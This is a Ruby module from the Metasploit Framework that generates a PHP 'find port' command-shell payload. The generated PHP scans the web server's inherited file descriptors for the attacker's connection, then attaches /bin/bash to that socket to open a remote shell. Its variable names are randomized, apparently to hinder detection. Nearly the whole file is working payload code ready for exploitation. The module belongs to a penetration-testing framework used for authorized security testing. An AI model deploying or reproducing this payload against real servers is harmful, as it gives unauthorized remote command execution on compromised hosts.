##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/core/handler/find_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Find Port',
			'Version'       => '$Revision$',
			'Description'   => %Q{
				Spawn a shell on the established connection to
				the webserver.  Only tested on Apache but it 
				might work on other web servers that leak file
				descriptors to child processes.
				},
			'Author'        => [ 'egypt <egypt@metasploit.com>' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Handler'       => Msf::Handler::FindShell,
			'Session'       => Msf::Sessions::CommandShell,
			'Arch'          => ARCH_PHP
			))
	end

	def php_findsock

		var_cmd = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
		var_fd  = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
		var_out = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
		shell = <<END_OF_PHP_CODE
error_reporting(0);
print("<html><body>");
flush();

function mysystem(#{var_cmd}){
	#{php_preamble()}
	#{php_system_block({:cmd_varname=>var_cmd, :output_varname => var_out})}
	return #{var_out};
}

#{var_fd} = 13;
for ($i = 3; $i < 50; $i++) {
	$foo = mysystem("/bin/bash 2>/dev/null <&$i -c 'echo $i'");
	if ($foo != $i) {
		#{var_fd} = $i - 1;
		break;
	}
}
print("</body></html>\n\n");
flush();

#{var_cmd} = "/bin/bash <&#{var_fd} >&#{var_fd} 2>&#{var_fd}";
mysystem(#{var_cmd});

END_OF_PHP_CODE

		
		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return php_findsock
	end

end